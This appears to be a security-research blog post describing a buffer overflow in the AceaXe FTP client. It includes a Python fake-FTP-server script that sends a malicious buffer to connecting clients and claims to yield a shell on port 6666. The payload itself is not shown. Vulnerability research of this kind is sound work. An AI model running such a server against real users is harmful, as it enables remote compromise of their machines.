---
layout: post
title: "RCE via Buffer Overflow - AceaXeFTP"
categories: CVE_Research
---

**RCE via Buffer Overflow - AceaXeFTP**{: style="color: greenyellow"}

# Summary:
It's Possible to trigger a buffer overflow, in AceaXeFTP client, by hosting a malicious ftp server and sending malicious responses to the client.

# Bin info:
Name: AceaXe +
Homepage: http://www.labf.com/aceaxeplus/index.html

# Proof of Concept (PoC):

Studying to take the OSCE exam, i was simply fascinated by the Exploit dev topic, ASLR Bypass and SEH based exploits, was something that i needed to see in the internet jungle.
&nbsp;

Doing the exercises, i was able to successfuly exploit one of the examples. So, i thought "Yeah, it's time to find a really old software that i could run in a windows vista and try to find some AAAA shenanigans", and that's what i did, got first a windows xp and windows vista vm running and the AceaXe software bundle installed.
&nbsp;

First, as i was really confortable with the basics of exploit dev, because of the OSCP background, i tried finding something in the windows xp, as it would not have ASLR nor DEP, so it would be easy to exploit. 
&nbsp;

As i was researching i found a lot of PoCs of ftp clients that got exploited by sending the response of the ftp commands with the exploit code. so, after some hours of trying a lot of gui overflows and file sizes oveflows, I finnally tried creating my own fake FTP server in python and sending the famous EHLO response with a giant string &afterwords, and it worked, EIP was finnaly overwritten by the AAAAs ! 
&nbsp;

# Finnally ! Time to exploit (winXP version):

The concept was easy. Create a simple socket listening to port 21, that sends the string after the client connects to it.

&nbsp;
{% highlight python %}


port = 21                   
s = socket.socket()
host = '0.0.0.0'              
try:
	s.bind((host, port))            
	s.listen(5)                     
	print ('[+] Ouvindo na porta 21.')
except:
	print ('[-] Problemas no socket, veja se a porta 21 ja esta sendo utilizada')
while True:
 	try:
	    conn, addr = s.accept()
	    print ('[+] Envindo o payload')     
	    conn.send(dadosenviados)
	    conn.close()
	    print ('[+] Chegou tua shell na porta 6666')
	except:
		print ('[-] Tivemos um prolema, veja se tudo foi settado corretamente')
{% endhighlight %}
&nbsp;

So, after Creating a FTP server I was able to send the malicious Buffer, to exploit this vulnerability. and after doind all the steps needed to create the simple buffer overflow i was able to retrieve a Command shell on the machine
&nbsp;

#CVE

Coming soon


